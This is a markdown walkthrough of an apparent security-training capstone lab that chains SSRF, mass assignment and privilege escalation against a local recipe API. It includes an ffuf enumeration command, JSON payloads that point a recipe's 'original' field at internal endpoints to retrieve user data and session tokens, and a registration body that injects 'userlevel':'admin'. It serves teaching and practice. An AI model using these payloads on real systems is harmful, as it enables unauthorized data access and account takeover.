# 📝 Capstone Project Walkthrough: SSRF, Mass Assignment, and Privilege Escalation

---

## 🚀 High-Level Summary

This capstone project demonstrates multiple chained vulnerabilities, including **Server-Side Request Forgery (SSRF)**, **Mass Assignment**, and **Privilege Escalation**, to exploit the application's weak points. Using tools like `ffuf` for endpoint enumeration and manual API manipulation in Postman and Burp Suite, the attacker gains admin access to retrieve sensitive recipe data.

---

## 📚 Definition Bank

| **Term**                               | **Definition**                                                                                           | **Key Notes**                                                                       |
| -------------------------------------- | -------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------- |
| **SSRF (Server-Side Request Forgery)** | A vulnerability that allows an attacker to make the server fetch resources from unintended destinations. | Exploited by modifying the `original` key in a recipe to access internal endpoints. |
| **Mass Assignment**                    | Unauthorized modification of object properties by passing unexpected fields during data input.           | Exploited by adding `userlevel:admin` during registration to escalate privileges.   |
| **Privilege Escalation**               | Gaining higher-level access than permitted by exploiting vulnerabilities or misconfigurations.           | Achieved by registering as an admin and accessing admin-only resources.             |
| **ffuf**                               | A web fuzzing tool used to discover hidden endpoints or parameters in web applications.                  | Used here to find internal `uptime` and `users` actions.                            |
| **dirb/big.txt**                       | A commonly used wordlist for directory and endpoint enumeration in web applications.                     | Helps in discovering hidden endpoints during fuzzing.                               |

---

## 🌟 Key Attack Chain Steps

1. **Enumerate Endpoints with `ffuf`:**
    
    - Command used:
        
        ```bash
        ffuf -u http://localhost:3000/v1/data/internal/FUZZ -w /usr/share/seclists/dirb/big.txt
        ```
        
    - Result: Discovered `/v1/data/internal/uptime` and `/v1/data/internal/users`.
2. **Confirm SSRF Vulnerability:**
    
    - Modify the `original` key in the `PUT /v1/recipes/:id` request to point to external and internal URLs:
        
        ```json
        {
          "original": "http://google.com"
        }
        ```
        
    - Result: The server fetches Google’s HTML, confirming SSRF.
3. **Exploit SSRF for Internal Data:**
    
    - Use internal endpoints:
        
        ```json
        {
          "original": "http://localhost:3000/v1/data/internal/users"
        }
        ```
        
    - Result: Retrieve sensitive user data, including session tokens and passwords.
4. **Exploit Mass Assignment:**
    
    - Register a new user with an elevated privilege level:
        
        ```json
        {
          "username": "newuser",
          "password": "newuser",
          "userlevel": "admin"
        }
        ```
        
    - Result: Successfully create an admin user.
5. **Privilege Escalation:**
    
    - Use the admin session token to access restricted endpoints:
        
        ```json
        {
          "sessionId": "admin-session-token"
        }
        ```
        
    - Example endpoint:
        
        ```http
        GET /v1/data/admin/recipes
        ```
        

---

## 🛠️ Steps to Complete the Capstone

### Step 1: Register a New User

- Endpoint: `POST /v1/auth/register`
- Request Body:
    
    ```json
    {
      "username": "test",
      "password": "test"
    }
    ```
    

### Step 2: Decode Session Token

- Decode the Base64 session token:
    
    ```bash
    echo -n 'dGvzdGJkRW1DOQ==' | base64 -d
    ```
    
- Result: `test+random characters`.

### Step 3: Enumerate Internal Endpoints

- Use `ffuf` to enumerate possible internal actions:
    
    ```bash
    ffuf -u http://localhost:3000/v1/data/internal/FUZZ -w /usr/share/seclists/dirb/big.txt
    ```
    
- Results:
    - `/v1/data/internal/uptime`
    - `/v1/data/internal/users`

### Step 4: Confirm SSRF Vulnerability

- Endpoint: `PUT /v1/recipes/:id`
- Request Body:
    
    ```json
    {
      "original": "http://google.com"
    }
    ```
    
- Result: Response contains Google’s HTML.

### Step 5: Exploit SSRF for Sensitive Data

- Modify the `original` key:
    
    ```json
    {
      "original": "http://localhost:3000/v1/data/internal/users"
    }
    ```
    
- Result: Retrieve user-level data and session tokens.

### Step 6: Exploit Mass Assignment

- Register a new user with elevated privileges:
    
    ```json
    {
      "username": "newuser",
      "password": "newuser",
      "userlevel": "admin"
    }
    ```
    

### Step 7: Access Admin-Only Resources

- Use the admin session token to access `/v1/data/admin/recipes`:
    
    ```json
    {
      "sessionId": "admin-session-token"
    }
    ```
    

---

## 🔑 Key Takeaways

1. **SSRF**: Exploit internal server behavior to fetch unauthorized data.
2. **Mass Assignment**: Inject unauthorized fields to elevate privileges.
3. **Privilege Escalation**: Use elevated privileges to access restricted resources.
